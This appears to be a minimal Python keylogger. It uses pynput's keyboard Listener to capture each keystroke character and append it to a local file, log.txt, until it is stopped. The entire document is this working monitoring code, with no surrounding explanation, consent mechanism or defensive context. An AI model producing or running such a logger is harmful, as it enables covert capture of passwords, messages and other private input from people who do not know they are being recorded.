from pynput.keyboard import Listener

def write_to_file(key):
    
    try:
        with open("log.txt", "a") as f:
            f.write(key.char)
    
    except AttributeError:
        pass

with Listener(on_press=write_to_file) as l:
    l.join()

